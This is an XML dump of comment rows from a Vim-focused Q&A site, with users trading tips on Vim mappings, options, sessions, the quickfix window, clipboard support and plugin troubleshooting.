  <row Id="4555" PostId="3258" Score="0" Text="@FDinoff: _&quot;`nohlsearch` does something different from `set nohlsearch`&quot;_ - Yes, but I think toggling `hlsearch` is far more useful." CreationDate="2015-05-13T05:51:00.953" UserId="1577" />
  <row Id="4556" PostId="3246" Score="0" Text="The last command should read `4G&quot;ayy`." CreationDate="2015-05-13T08:13:02.457" UserId="54" />
  <row Id="4557" PostId="3260" Score="0" Text="Thank you. I'll play with folding a bit and see how useful that is. I'll go over the help section for signs, I didn't read that yet as I thought that the term signs refers only to Chris's plugin, not a native feature." CreationDate="2015-05-13T08:45:32.643" UserId="989" />
  <row Id="4558" PostId="3262" Score="3" Text="You can also use [``set noesckeys``](http://vimhelp.appspot.com/options.txt.html#%27noek%27); this has the side effect of disabling the arrow keys (and perhaps some other keys?) in Insert mode though, so it may not be for everyone." CreationDate="2015-05-13T15:25:57.610" UserId="51" />
  <row Id="4560" PostId="2463" Score="1" Text="This variant will also work correctly for visual mode: `noremap &lt;expr&gt; gM (virtcol('$') / 2) . '&lt;Bar&gt;'`" CreationDate="2015-05-13T18:16:55.327" UserId="970" />
  <row Id="4561" PostId="3263" Score="0" Text="This is absolutely terrific. I have been toying around with getting the function name in the statusbar for years, with varying levels of success. This post answers all the questions that I had and resolved all the issues that I had. I can't accept it as the answer because it does not address the question, so I'll go ask that question in a new thread. Thank you!" CreationDate="2015-05-13T18:32:23.830" UserId="989" />
  <row Id="4563" PostId="3263" Score="0" Text="[Here](http://vi.stackexchange.com/questions/3266/display-name-of-current-method-in-php-files) is a good place to answer this answer, so that I could accept it. Thanks." CreationDate="2015-05-13T18:38:12.190" UserId="989" />
  <row Id="4564" PostId="3267" Score="0" Text="The example you give should work, is there something more specific you are having a problem with?" CreationDate="2015-05-13T19:28:56.560" UserId="895" />
  <row Id="4565" PostId="3267" Score="0" Text="Your given command replaces with `time` (the other way around). Please add exact expected results, and a description of what exactly you're struggling with!" CreationDate="2015-05-13T19:52:22.933" UserId="970" />
  <row Id="4566" PostId="3267" Score="0" Text="Say for example the file had:&#xA;`Time: 60 minutes&#xA;Seconds: 3600&#xA;Milliseconds: 36000`&#xA;&#xA;What am looking for is after the replace,&#xA;`Time: 60 minutes&#xA;Time: 3600&#xA;MilliTime: 36000`&#xA;&#xA;Basically, I would like to know how I can be more specific about only replacing lines that have Seconds in the string, and avoiding the others if there were more than just these 3 lines." CreationDate="2015-05-13T19:53:49.187" UserId="2077" />
  <row Id="4567" PostId="3267" Score="0" Text="Read `:help :range`; it has all the details on how to be more specific than the global `:%` range." CreationDate="2015-05-13T20:14:54.073" UserId="970" />
  <row Id="4568" PostId="3262" Score="2" Text="@Carpetsmoker Regarding &quot;set noesckeys&quot;... that works, but only if in Insert mode.  I know I said I was in Insert mode to begin with; however I also often do &lt;Esc&gt;O starting from Normal mode (mainly when I'm not 100% sure whether I'm starting in Insert or Normal mode) so I'd like something that works in that case too." CreationDate="2015-05-13T20:53:40.927" UserId="2065" />
  <row Id="4572" PostId="3263" Score="2" Text="@dotancohen Thanks :-) I'm not sure of a new question is really required; your &quot;core problem&quot; description reads *&quot;I need another way of determining when I've `n`ed into another function.&quot;*, which is what this answer tries to solve, although It does this in a rather different way than you asked for, but that's because I think what you're asking for is not possible (could be wrong, of course) ..." CreationDate="2015-05-13T22:18:53.960" UserId="51" />
  <row Id="4573" PostId="3262" Score="1" Text="@DonHatch You can use `:nnoremap ^[O O`, where `^[` is entered by pressing `&lt;C-v&gt;&lt;Esc&gt;` (may also show up as `&lt;1b&gt;`)." CreationDate="2015-05-13T22:30:20.017" UserId="51" />
  <row Id="4574" PostId="3270" Score="0" Text="Weirdly, from the comment: &quot;What am looking for is after the replace, Time: 60 minutes Time: 3600 MilliTime: 36000&quot;." CreationDate="2015-05-13T23:21:34.627" UserId="205" />
  <row Id="4576" PostId="3272" Score="0" Text="Note that I do not wish to use abbreviations or mappings, since these will replace the text." CreationDate="2015-05-14T07:20:38.750" UserId="2082" />
  <row Id="4579" PostId="3273" Score="1" Text="A session saved with `:mksession` is a *whole* session. If there was a way to load a session into an active session it would replace existing buffers and do all kinds of things that would mess it up. Sessions are only meant to be used with the `-S` argument at startup." CreationDate="2015-05-14T10:00:55.087" UserId="54" />
  <row Id="4581" PostId="3273" Score="0" Text="@romainl ah thats a shame.  Is there any other method of storing a list of open files?  That's the main thing I'm interested in" CreationDate="2015-05-14T11:04:27.353" UserId="1518" />
  <row Id="4582" PostId="3271" Score="0" Text="It's looking like you are trying install plugin via pathogen, but you don't have one. Does other 3rd party plugins work for you?" CreationDate="2015-05-14T13:26:08.317" UserId="500" />
  <row Id="4583" PostId="3272" Score="0" Text="I presume you're deliberately using `&lt;C-\&gt;&lt;C-N&gt;` instead of &lt;Esc&gt; because you don't like the beep? Also, surely an nmap means you'll already be in normal mode? Is that just a typo, or am I missing something?" CreationDate="2015-05-14T15:34:52.103" UserId="343" />
  <row Id="4584" PostId="3271" Score="0" Text="None of the plugins work....what is the problem" CreationDate="2015-05-14T15:40:57.800" UserId="2086" />
  <row Id="4585" PostId="3271" Score="0" Text="I'd recommend you to reinstall vim, because your file hierarchy kind of messy maybe something went wrong when you tried to solve this issue. After reinstaling vim install pathogen plugin, and after it just put emmet in the pathogen's bundle directory. It should work." CreationDate="2015-05-14T16:42:13.487" UserId="500" />
  <row Id="4586" PostId="1917" Score="2" Text="In step 3. you can move faster using object motions. For example can use `}` to select entire paragraph or `)` for sentences. There are more, you can read about them in `:h object-motions`" CreationDate="2015-05-14T18:55:51.677" UserId="2022" />
  <row Id="4587" PostId="1917" Score="1" Text="Also searching for a substring with `/something&lt;CR&gt;` is a very efficient method to reach to the end of your selection block" CreationDate="2015-05-14T18:59:54.840" UserId="2022" />
  <row Id="4588" PostId="3280" Score="0" Text="In my case (on OS X) `vim -E http://example.com/` works as expected (it's populated) and `/&lt;head&gt;` also works (as you've shown), but the main problem is that it doesn't work when everything is in one line. Just run: `:%j` before doing search and you'll see." CreationDate="2015-05-14T19:28:10.750" UserId="467" />
  <row Id="4589" PostId="3280" Score="1" Text="I forgot the trailing slash. Ex is line-based: if everything is on one single line that mode is near useless and there is no &quot;cursor&quot; to place on `&lt;head&gt;` anyway." CreationDate="2015-05-14T19:39:44.683" UserId="54" />
  <row Id="4590" PostId="3280" Score="0" Text="It's not useless, as I'm require this for my script which is to find the tag and remove the content of the inner tag (e.g.  `/&lt;head` and `norm vitd`) from the file, but it's another story. So finding pattern and placing the cursor on the tag is the key, but unfortunately my html code for parsing doesn't have much new lines, that's why it's failing." CreationDate="2015-05-14T19:44:34.767" UserId="467" />
  <row Id="4591" PostId="3280" Score="0" Text="You actually can place the cursor on `&lt;head&gt;` in Ex mode, as I've shown in my other answer. You can see cursor moving when going back to `visual` mode when executing motion movements, so its position changes (by jumping to the next match: `norm n`)." CreationDate="2015-05-14T19:50:42.127" UserId="467" />
  <row Id="4592" PostId="3282" Score="0" Text="Interesting plugin; I hope you are aware of [the ColorSel plugin](http://www.vim.org/scripts/script.php?script_id=927), which also implements a (generic) color selector." CreationDate="2015-05-14T19:54:09.757" UserId="970" />
  <row Id="4593" PostId="3284" Score="0" Text="*Right* after I committed a solution using a gross loop to scan manually. :D Thanks!" CreationDate="2015-05-14T19:56:11.890" UserId="72" />
  <row Id="4594" PostId="3282" Score="0" Text="Not seen that one, but I know there's quite a few. Thanks for pointing it out. Mostly I write these for my own edification, I find that they teach me interesting things about vim." CreationDate="2015-05-14T19:57:31.360" UserId="72" />
  <row Id="4596" PostId="403" Score="1" Text="Maybe not an official term, but I've heard the word *chord* used to describe key sequences with `Ctrl`." CreationDate="2015-05-15T03:48:55.073" UserId="64" />
  <row Id="4597" PostId="3285" Score="4" Text="Can you clarify your question further more, please? By specifying some sample input and expected outcome?" CreationDate="2015-05-15T11:34:51.120" UserId="467" />
  <row Id="4598" PostId="3288" Score="0" Text="The &quot;whatever&quot; reason is that you are supposed to leave the second line of your git commit blank. That is the preferred style with git commits: 1 short line (~60 characters) describing the commit, followed by a blank line, followed by an explanation as large as you want/can." CreationDate="2015-05-15T11:34:51.660" UserId="850" />
  <row Id="4599" PostId="3288" Score="0" Text="@Shahbaz: Ok thanks for the explanation, that clears things up. I've only used git casually for some private stuff so far but have never actually learned it (i.e. read a guide or so), so I'm not yet aware of such things. Reading the git book is on my TODO list, though, before starting to use git more extensively." CreationDate="2015-05-15T11:52:23.993" UserId="2100" />
  <row Id="4600" PostId="3288" Score="0" Text="Git is awesome and can do things beyond your imagination, yet is very simple for everyday use. Happy learning!" CreationDate="2015-05-15T12:21:14.213" UserId="850" />
  <row Id="4601" PostId="3289" Score="0" Text="Thanks for your answer. But do I understand it correctly that your suggested solutions/workarounds are to change the syntax files (i.e. to specify that a specific highlighting should have precedence to the colorline highlighting)? If so, that's not what I'm looking for, what I'd like to specify is for the colorline highlighting to be placed behind any syntax highlighting. In that case, I'll just have to accept the way it works, i.e. that syntax highlighting is always overridden by the colorline highlighting." CreationDate="2015-05-15T12:22:22.313" UserId="2100" />
  <row Id="4602" PostId="3289" Score="0" Text="Syntax files usually don't define colors, they just `:hi link` to existing groups (like `Todo`). My workaround would have you change your personal colorscheme, either directly or in your `.vimrc`." CreationDate="2015-05-15T12:57:59.587" UserId="970" />
  <row Id="4603" PostId="3285" Score="0" Text="@kenorb It was just a Q&amp;A thing that I wanted to post, I just thought to myself that really there are several ways to accomplish something very simple and wanted to share them here (since Vi is now off-topic on SuperUser and SO). I'll edit the question a bit better to reflect that. And I wanted to narrow it down a bit further to avoid the replace-mode way." CreationDate="2015-05-15T13:20:20.537" UserId="662" />
  <row Id="4604" PostId="3292" Score="0" Text="sadly, there is no way to limit the range of [(, as i am looking for unclosed parenthesis in the range of one line, updated my question to make more obvious." CreationDate="2015-05-15T13:51:54.967" UserId="2056" />
  <row Id="4605" PostId="3294" Score="0" Text="indeed, not an easy job." CreationDate="2015-05-15T14:37:00.480" UserId="2056" />
  <row Id="4606" PostId="3285" Score="0" Text="It's ok to post, but the thing is that you don't give enough details/explanation within the question, so people won't understand what's the answer about if they don't understand what was the problem in the first place, in other words you're not allowing other users to post alternative solutions, because the problem isn't clarified enough. E.g. 'a specific number of characters' and 'through the INSERT mode' is ambiguous. Just giving some sample text example (in and out) would be great." CreationDate="2015-05-15T15:43:12.703" UserId="467" />
  <row Id="4607" PostId="3286" Score="2" Text="The question asks: 'through the INSERT mode', but when you type `5s` then you type it literally. If you don't mean in INSERT mode, then you've to press Escape first to exit this mode, unless you was thinking about COMMAND mode. That's why isn't clear for me." CreationDate="2015-05-15T15:45:17.403" UserId="467" />
  <row Id="4608" PostId="3285" Score="0" Text="@kenorb I understand, not sure how to edit it better, I just wanted to post a Q&amp;A about ways to change characters that don't include replace mode (as I believe that's already covered)." CreationDate="2015-05-15T15:47:40.287" UserId="662" />
  <row Id="4609" PostId="3297" Score="5" Text="And you can use `:echo indent('.') / &amp;shiftwidth` to get the indent width of the current line (that's what `.` refers to) divided by the `shiftwidth` to get the indentation level." CreationDate="2015-05-15T16:09:06.760" UserId="51" />
  <row Id="4610" PostId="3295" Score="0" Text="Thanks! It's actually what I wanted. By the way I already found this facility in https://github.com/jeetsukumaran/vim-buffergator plugin, but for me it's just overkill to use this plugin only for 2 commands, maybe if I need more comprehensive tool for bufer managment, but not now." CreationDate="2015-05-15T16:45:23.063" UserId="500" />
  <row Id="4611" PostId="3289" Score="0" Text="Ok yes sure, at second thought that's more or less what I meant. Still, I'd have to change the behaviour of specific highlightings in order to override that of cursorline, rather than changing the behaviour of cursorline to be overridden by any highlightings (which apparently isn't possible). So for now I'll just (have to) accept fate, but your workaround might come in handy if there are a few specific highlightings that often annoy me, and which I could then fix selectively." CreationDate="2015-05-15T17:02:12.813" UserId="2100" />
  <row Id="4612" PostId="3302" Score="0" Text="I've added `n`, because I'm confused when Vim set the cursor on matched pattern and when it's not. I guess in Ex mode it doesn't set cursor properly on the pattern (it seems so, because the tag is at the beginning of the line), but when it is in the middle, it won't work. So I think the `n` is necessary to make this works for these both cases. See: [this](http://vi.stackexchange.com/q/3276/467) for more details." CreationDate="2015-05-16T10:44:01.523" UserId="467" />
  <row Id="4613" PostId="3303" Score="0" Text="The logging didn't help much, but after starting it without plugins and then editing the vimrc (it created a new one - so I guess it was missing) the next time it started up fine. Thanks" CreationDate="2015-05-16T10:52:21.547" UserId="460" />
  <row Id="4614" PostId="3302" Score="0" Text="Why do you use Ex mode at all (with all its complications)? To automate Vim, see http://stackoverflow.com/a/23237529/813602 for possibilities." CreationDate="2015-05-16T10:56:53.720" UserId="970" />
  <row Id="4615" PostId="3302" Score="0" Text="I'm using `ex` to make and look it simple as part of the script and I'm learning it at the same time. Secondly it's distributed widely by default (opposite to vim). The other thing is that I can always add silent (`-s`), so the screen doesn't blink when I run the script and I can also deal with stdin and stdout easily. I know I can use `vi` instead of `vim`, but on OSX it's linked to `vim` by default, so it's the same thing (so I can't check the compatibility of my changes with plain `vi`), that's why the easiest way for me is to use `ex`, so it's cross-platform compatible." CreationDate="2015-05-16T11:06:27.460" UserId="467" />
  <row Id="4616" PostId="3302" Score="0" Text="But the cursor issue for search patterns is not `ex` specific thing, the same happens in Vim Ex-mode that the cursor isn't set properly, so you've to still use `n` (when the string is somewhere in the middle of the line). Unless you've some better idea." CreationDate="2015-05-16T11:19:02.100" UserId="467" />
  <row Id="4617" PostId="3304" Score="0" Text="Great. I came to the same conclusion after my confusion, because Vim wasn't actually showing me this new line, but it was there after save." CreationDate="2015-05-16T11:33:49.133" UserId="467" />
  <row Id="4618" PostId="3304" Score="1" Text="@kenorb by the way you can show all EOL charachters using this comand `:set listchars=eol:$`" CreationDate="2015-05-16T11:41:13.713" UserId="500" />
  <row Id="4619" PostId="3263" Score="0" Text="Accepted for resolving the _issue_. Thanks!" CreationDate="2015-05-16T13:55:32.040" UserId="989" />
  <row Id="4620" PostId="3309" Score="1" Text="Also note that `2g_` will also work if you want to go to the last non whitespace character on the next line.  However, this can't be used for the previous line.  The advantage of `2g_` is that it can be repeated with `.`" CreationDate="2015-05-17T13:27:05.350" UserId="865" />
  <row Id="4621" PostId="3307" Score="0" Text="I don't think there is any way of doing this by default, but you could probably create a plugin which does." CreationDate="2015-05-17T13:29:39.827" UserId="865" />
  <row Id="4622" PostId="3309" Score="1" Text="Motions (like `g_`) are not repeatable with `.`. Generally, only things that change the state of the buffer can be repeated." CreationDate="2015-05-17T22:01:50.517" UserId="64" />
  <row Id="4623" PostId="3309" Score="0" Text="Though, when combined with an operator, repeating works. Perhaps that's what you were referring to" CreationDate="2015-05-17T22:04:15.423" UserId="64" />
  <row Id="4624" PostId="3309" Score="0" Text="Ah, I didn't realize motions weren't repeatable.  I should look at the docs before I say things." CreationDate="2015-05-18T00:13:07.317" UserId="865" />
  <row Id="4625" PostId="3317" Score="1" Text="`gvim -u NONE -U NONE` has it working fine, so I must just have a plugin doing something weird." CreationDate="2015-05-18T05:44:23.607" UserId="488" />
  <row Id="4626" PostId="3318" Score="0" Text="Doing some testing, using a vimrc with only `set wildignore=*.png,` isn't enough to cause this, so maybe parsing gets stuck with any trailing comma?" CreationDate="2015-05-18T06:11:44.893" UserId="488" />
  <row Id="4628" PostId="3318" Score="0" Text="We'll see if it really is a bug https://code.google.com/p/vim/issues/detail?id=365" CreationDate="2015-05-18T06:41:27.763" UserId="488" />
  <row Id="4629" PostId="3321" Score="0" Text="Thanks a lot for your tips (I'll also check your plugin)! Your answer leads me to another question (I don't know if I should create a new one or ask it here): let's say I want to map `P` to call `setreg()` and then put but only when I made a block selection is there a way to create such a mapping? I can't create it only in visual mode because it is not relevant and create it in normal mode would override `P` each time which is not what I want neither." CreationDate="2015-05-18T12:00:27.893" UserId="1841" />
  <row Id="4630" PostId="3321" Score="0" Text="You can use `getregtype()` to check whether the register contains a blockwise selection. But in my opinion, blockwise paste can be useful, too, so I would recommend a separate mapping." CreationDate="2015-05-18T12:31:32.183" UserId="970" />
  <row Id="4631" PostId="3302" Score="2" Text="Using `dit` would be simpler (and faster?) for a batch command." CreationDate="2015-05-18T13:36:07.237" UserId="599" />
  <row Id="4632" PostId="3321" Score="0" Text="Yes I think you're right. Anyway I checked your plugin and I think I will simply use that it is the most convenient. Thanks again for your answers!" CreationDate="2015-05-18T13:38:20.583" UserId="1841" />
  <row Id="4633" PostId="3313" Score="2" Text="aren't we all ? I mean, I cannot efficiently use vim without my own vimrc." CreationDate="2015-05-18T15:21:46.917" UserId="2056" />
  <row Id="4634" PostId="3318" Score="0" Text="I would claim not a bug. This setting is a comma separated list. Since there is already a trailing comma in the setting it means that an empty item is in the setting. (Whether an empty item means anything is probably dependent on the setting). When you do `+=` on a setting  that is a comma separated list it will always add a comma unless it is empty since you are trying to add something to the list. Using the existing comma would remove the empty item. Which is probably unexpected. (`:help :set+=`) (However the empty item ignoring everything could be a bug)" CreationDate="2015-05-18T17:11:55.847" UserId="46" />
  <row Id="4635" PostId="3318" Score="0" Text="@FDinoff that's a good point, there could be a setting which expects an empty item." CreationDate="2015-05-18T18:07:10.667" UserId="488" />
  <row Id="4636" PostId="3306" Score="0" Text="Default behavior: add 'foldmarker' surrounded by 'commentstring'&#xA;:he foldmarker -&gt; 	string (default: &quot;{{{,}}}&quot;)&#xA;:he commentstring -&gt; string	(default &quot;/*%s*/&quot;)&#xA;'commentstring' is used if it isn't empty." CreationDate="2015-05-19T10:29:55.223" UserId="1145" />
  <row Id="4638" PostId="3329" Score="1" Text="That seems efficient enough for me. Thanks!" CreationDate="2015-05-19T15:45:32.277" UserId="1841" />
  <row Id="4639" PostId="3327" Score="2" Text="The answers to the duplicate question basically focus on slowness related with too many syntax items. The person who asked the question was using EasyTags with tags syntax highlight enabled. I've added another answer regarding vim's slowness when using syntax folding, which might be what is affecting @Thomson." CreationDate="2015-05-19T18:52:29.550" UserId="599" />
  <row Id="4640" PostId="3334" Score="0" Text="Why exactly do you `gf` in the quickfix window? Use `&lt;CR&gt;` to open a quickfix entry. Also, use `&lt;C-w&gt;p` to put the cursor in the previous window." CreationDate="2015-05-19T22:01:04.757" UserId="54" />
  <row Id="4641" PostId="3337" Score="3" Text="Right away map `:cnext` and `:cprev` to something convenient. Personally I use `]q` and `[q` which are provided by [unimpaired.vim](https://github.com/tpope/vim-unimpaired). If you pick good mappings you will be surprised how little you need the quickfix window." CreationDate="2015-05-19T23:46:16.697" UserId="778" />
  <row Id="4642" PostId="3329" Score="2" Text="You may be interested in the following [vimcast](http://vimcasts.org/) episodes: [Pasting from Visual mode](http://vimcasts.org/episodes/pasting-from-visual-mode/) and [Swapping two regions of text with exchange.vim](http://vimcasts.org/episodes/swapping-two-regions-of-text-with-exchange-vim/)" CreationDate="2015-05-19T23:48:35.490" UserId="778" />
  <row Id="4643" PostId="3335" Score="2" Text="Could also use an expression mapping with some conditional. e.g. `map! &lt;expr&gt; \bbq get(g:, 'use_mappings', 1) ? 'ℚ' : '\bbq'`. Now you can do `:let g:use_mappings = 0` to turn off the mappings. I also feel like these mappings should be abbreviations instead of mappings." CreationDate="2015-05-19T23:52:15.623" UserId="778" />
  <row Id="4644" PostId="3335" Score="0" Text="@PeterRincker I like to be able to search for α say by typing /\alpha. That works with `map!` but not `ab`." CreationDate="2015-05-20T03:39:15.927" UserId="2160" />
  <row Id="4645" PostId="3337" Score="1" Text="Indeed, `:cn` and `:cp` become tedious very quickly, even with `@:`. I have them mapped to `&lt;End&gt;` and `&lt;Home&gt;` respectively." CreationDate="2015-05-20T07:08:41.640" UserId="54" />
  <row Id="4646" PostId="3338" Score="1" Text="Thats is a totally valid way to do it and I didn't know &lt;kbd&gt;Ctrl+R&lt;/kbd&gt;. So thats a good answer thank you." CreationDate="2015-05-20T07:41:34.640" UserId="1841" />
  <row Id="4647" PostId="1938" Score="0" Text="This method doesn't work for me: instead of maximizing the window it opens a pop-up menu allowing to restaure, move, minimize, maximize(...) the window. I'm using Windows 7 SP1 and gvim 7.4.711. How can I make it work?" CreationDate="2015-05-20T07:48:22.393" UserId="1841" />
  <row Id="4648" PostId="1938" Score="0" Text="@statox, that's what you'd see if you left off the `x` from the end. Make sure you have the _full_ text `au GUIEnter * sim ~x`." CreationDate="2015-05-20T07:52:53.243" UserId="579" />
  <row Id="4649" PostId="1938" Score="0" Text="@paxdiablo I'm not sure to understand I copied the full line (both long and short version) from `au` to `~x`. Is there a whitespace caracter I'm missing or something like that?" CreationDate="2015-05-20T07:57:14.653" UserId="1841" />
  <row Id="4650" PostId="1938" Score="0" Text="@statox, when you have a gvim window open and you mouse-click the system button (the vim icon most top-left, above the file menu), do you see a maximize? When that system menu is open, does it maximise when you press x?" CreationDate="2015-05-20T08:06:03.313" UserId="579" />
  <row Id="4651" PostId="1938" Score="0" Text="@paxdiablo, I understand the problem now: when I open this menu pressing `x` doesn't maximize the window. On mmy system it is the key `n` which does the job (probably because it is a french system). Thank you for your comment it helped me to understand what happened!" CreationDate="2015-05-20T08:16:10.357" UserId="1841" />
  <row Id="4652" PostId="1938" Score="0" Text="Good point, @statox, I'll update the answer to mention how it works and how locale can affect it." CreationDate="2015-05-20T08:42:56.027" UserId="579" />
  <row Id="4653" PostId="3340" Score="0" Text="This doesn't look like the cursorline. It's probably something in your vimrc file. See: [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51)." CreationDate="2015-05-20T11:15:48.710" UserId="51" />
  <row Id="4654" PostId="3340" Score="2" Text="This question [is also on Stack Overflow](http://stackoverflow.com/questions/30347416/cursorline-is-always-showing-after-the-cursor-go-over)." CreationDate="2015-05-20T11:21:44.293" UserId="51" />
  <row Id="4655" PostId="3340" Score="1" Text="I've seen something similar in the past.  I never got to the root cause of it, but I'm pretty sure it was related to a font problem, not to Vim." CreationDate="2015-05-20T11:25:18.500" UserId="1577" />
  <row Id="4656" PostId="3341" Score="1" Text="I'm fairly sure you don't need to recompile Vim to enable `+clipboard` on Debian. I don't have a Debian system available, but [when I wrote this](http://vi.stackexchange.com/a/96/51) people pointed out that installing the `vim-gtk` or `vim-gnome` package should do the trick. The only extra dependency you have for `vim-gtk` will be gtk2 (which you probably already have on most systems anyway). IMHO, the ability to upgrade easily is a lot less effort than installing a few extra dependencies." CreationDate="2015-05-20T13:56:28.490" UserId="51" />
  <row Id="4657" PostId="3341" Score="0" Text="Yes I could get it, but aptitude show vim-gnome shows _This package contains a version of vim compiled with a GNOME2 GUI and support for scripting with Lua, Perl, Python, Ruby, and Tcl._ and GTK, you need to replace GNOME with GTK. So it adds many more feature than the only one I need: +lua, +perl, and gnome/GTK things. Which on a whole would make vim much heavier." CreationDate="2015-05-20T13:57:53.240" UserId="2170" />
  <row Id="4658" PostId="3341" Score="2" Text="I did some very basic speed tests of Vim compiled with `--tiny` (almost no features) and `--huge` (all features), and didn't really notice a significant increase in memory or system usage. The tests very very basic, but unless you're noticing performance problems I wouldn't worry about it." CreationDate="2015-05-20T14:03:36.773" UserId="51" />
  <row Id="4659" PostId="3313" Score="0" Text="That's why you keep your vimrc on github or bitbucket and pull it down to the new machine." CreationDate="2015-05-20T14:09:35.997" UserId="1862" />
  <row Id="4660" PostId="3343" Score="0" Text="It looks like that did it! Thank you for your help." CreationDate="2015-05-20T14:50:00.763" UserId="1862" />
  <row Id="4661" PostId="3341" Score="0" Text="Just install vim-gnome or vim-gtk, you won't notice a difference. Except for the presence of clipboard support, that is. Clipboard support depends on  GUI anyway so you don't really have a choice, here. Also, did you try xclip?" CreationDate="2015-05-20T16:09:50.093" UserId="54" />
  <row Id="4663" PostId="3342" Score="4" Text="Why not just disable screensavers/timeout-to-lock on those machines? It'd be a much cleaner solution than to configure vim to work around Caffeine's strange behavior. Or at least make Caffeine simulate something like `&lt;Ctrl&gt;` instead of `&lt;F15&gt;`." CreationDate="2015-05-20T16:48:44.143" UserId="1081" />
  <row Id="4665" PostId="3343" Score="0" Text="It should be noted that presumably dead keys like `&lt;f15&gt;` are often used when  [Mapping fast keycodes in terminal Vim](http://vim.wikia.com/wiki/Mapping_fast_keycodes_in_terminal_Vim). Example of a plugin that does such a thing is [rsi.vim](https://github.com/tpope/vim-rsi)." CreationDate="2015-05-20T17:54:48.243" UserId="778" />
  <row Id="4667" PostId="3342" Score="1" Text="@Ruslan The point of using `&lt;F15&gt;` is that it very rarely means anything and is generally ignored; `&lt;Ctrl&gt;`, however, _is_ meaningful, and when triggered at the wrong time could cause unintended behavior." CreationDate="2015-05-20T18:19:06.510" UserId="1060" />
  <row Id="4669" PostId="3341" Score="0" Text="On the [page](http://vim.wikia.com/wiki/Accessing_the_system_clipboard) I have read about xclip and xsel. But I wanted to see if I had an alternative to 1) install options I am not interested in or 2) install a third party program. Reading both of your comments, it looks like I'm out of luck." CreationDate="2015-05-20T19:59:13.493" UserId="2170" />
  <row Id="4670" PostId="3336" Score="0" Text="The idea is write, the note, in Vim and only read it in Vim, so i prefer a syntax solution. I was hoping someone wrote something like what i need, i really dont know how to write that jaja" CreationDate="2015-05-20T20:47:32.690" UserId="2145" />
  <row Id="4671" PostId="3346" Score="0" Text="@bilbo_pingoin Yeah, sorry i should be more specific. i edit my question. The thing is how  can i highlight with colors some arbitrary part of my text?" CreationDate="2015-05-20T20:50:50.210" UserId="2145" />
  <row Id="4672" PostId="3336" Score="0" Text="For me, the _txtfmt_ plugin then looks perfect for this. It uses (invisible) markdown for the colors, but this has to be stored _somewhere_, and languages like HTML do it in a similar way." CreationDate="2015-05-20T20:54:52.203" UserId="970" />
  <row Id="4673" PostId="3346" Score="1" Text="Then you are probably back to @Ingo Karkat's suggestion: get you own syntax file. You can google around to see if someone already made one, but it is not that complicated to write a simple one. Once you're done, you can place it somewhere on the web (github?) to pass it from one place to another." CreationDate="2015-05-20T20:59:27.433" UserId="2170" />
  <row Id="4674" PostId="3336" Score="0" Text="But i cant read the same file in two different places with the same configuration. for example, in my home computer i wrote something like a nice red text but in my office computer i read 'µ' were should be the 'invisible red'. So i supose that txtfmt use some non-portable special characters" CreationDate="2015-05-20T21:07:54.230" UserId="2145" />
  <row Id="4675" PostId="3342" Score="0" Text="@Ruslan the OS is configured by the IT department to lock after a period of inactivity; running Caffeine allows me to bypass that, as long as I manually lock my machines when stepping away from my desk. Further, I don't have the source code for Caffeine, so I can't alter it." CreationDate="2015-05-20T21:40:27.773" UserId="1862" />
  <row Id="4676" PostId="3340" Score="0" Text="@lcd047 Thanks for your hint. I change my font size from 18 to 19, and it works. I agree that it's a font problem." CreationDate="2015-05-21T02:25:16.853" UserId="2168" />
  <row Id="4677" PostId="3342" Score="0" Text="Why doesn't it just simulate that event you get when you tap the touchpad when tapping isn't enabled, but it still focuses the window you're over - but over the current window so it doesn't do anything?" CreationDate="2015-05-21T04:01:55.260" UserId="880" />
  <row Id="4678" PostId="3336" Score="0" Text="Yes, the `µ` seems to be the markup character for red. Are you sure you have the txtfmt plugin installed on each computer?" CreationDate="2015-05-21T06:43:20.470" UserId="970" />
  <row Id="4681" PostId="3348" Score="0" Text="@niekas, then add `\s*` between `/^` and `[^`." CreationDate="2015-05-21T08:19:24.783" UserId="54" />
  <row Id="4682" PostId="3348" Score="0" Text="So the final query is: ``/^\s*import ipdb``. Thats exactly what I wanted." CreationDate="2015-05-21T08:22:48.080" UserId="147" />
  <row Id="4684" PostId="3352" Score="1" Text="Oh, the curse of today's gigantic flatscreens! As someone who started with a 40x24 character homecomputer screen, I can only shake my head in disbelief :-)" CreationDate="2015-05-21T15:54:59.410" UserId="970" />
  <row Id="4685" PostId="3342" Score="0" Text="@Random832 that's a good question; I didn't write the program, so I don't know the logic behind choosing `&lt;F15&gt;` other than what's posted on the site." CreationDate="2015-05-21T16:11:37.723" UserId="1862" />
  <row Id="4686" PostId="3352" Score="0" Text="My first home computer had a much bigger screen (640x480 if I recall correctly). But I still miss those awesome VT220 at the university! Still can't go over the image of the pile they created when throwing them out during my last years :'(" CreationDate="2015-05-21T17:21:31.173" UserId="599" />
  <row Id="4687" PostId="3354" Score="0" Text="Give me a day or two to test this around. Still need to adapt that to vim-airline ;) In the meanwhile, I've updated my question to specify the message I'm looking for. Could you confirm this solution still applies?" CreationDate="2015-05-21T17:23:19.510" UserId="599" />
  <row Id="4688" PostId="3354" Score="0" Text="@Vitor I'm not sure which &quot;X new lines&quot; message you mean, but almost all messages from Vim should end up in the message history. You can check this by typing `:messages` and see if it's there :-)" CreationDate="2015-05-21T17:46:45.927" UserId="51" />
  <row Id="4689" PostId="3354" Score="0" Text="the message is &quot;X more lines&quot;, my bad! :P But I confirm that they end up in `:messages`. Thanks!" CreationDate="2015-05-21T19:06:12.143" UserId="599" />
  <row Id="4690" PostId="3353" Score="0" Text="Static is probably not enough. It would make sense to shift the message to the column where the current window starts, but only if the message fits in the remainder of the line. But I wouldn't know even where to start looking in vim's code!" CreationDate="2015-05-21T19:16:45.330" UserId="599" />
  <row Id="4691" PostId="3354" Score="0" Text="Marked as the right answer, since there is no native support for this in Vim. Thanks once again." CreationDate="2015-05-21T19:17:22.937" UserId="599" />
  <row Id="4692" PostId="3357" Score="6" Text="The ftplugin for your language probably has mapping starting with `[` and `]` which may explain that sluggishness: if you have something mapped to `]]` (&quot;next method&quot; in python files), for example, Vim will wait a bit in order to see if you want `]` or `]]`." CreationDate="2015-05-21T19:54:49.437" UserId="54" />
  <row Id="4693" PostId="3357" Score="1" Text="Indeed, you're [right](https://github.com/vim-ruby/vim-ruby/blob/vim7.4/ftplugin/ruby.vim#L149-165). First, if you post an answer, I'll accept it. Also, can you explain by any chance why everything is fine if `filetype plugin on` is executed after `vim` has started?" CreationDate="2015-05-21T20:03:38.033" UserId="1553" />
